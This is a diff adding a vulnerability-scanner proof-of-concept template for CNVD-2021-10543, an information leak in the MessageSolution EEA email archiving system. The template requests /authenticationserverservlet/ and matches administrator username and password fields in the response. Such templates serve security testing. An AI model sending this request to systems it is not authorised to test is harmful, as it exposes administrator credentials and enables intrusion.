@@ -1,0 +1,17 @@
+name: poc-yaml-MessageSolution-EEA-CNVD-2021-10543-info-leak
+manual: true
+transport: http
+rules:
+    Mes0:
+        request:
+            cache: true
+            method: GET
+            path: /authenticationserverservlet/
+        expression: response.status == 200 && response.body.bcontains(b"<administratorusername>administrator")&& response.body.bcontains(b"<administratorpassword>")
+expression: Mes0()
+detail:
+    author: fengyang(https://github.com/bigDevi1)
+    links:
+        - https://mp.weixin.qq.com/s/_ieRHX-7nnnWMeflFcNEnQ
+        - https://github.com/Henry4E36/CNVD-2021-10543
+    description: MessageSolution 企业邮件归档管理系统 EEA 存在信息泄露漏洞
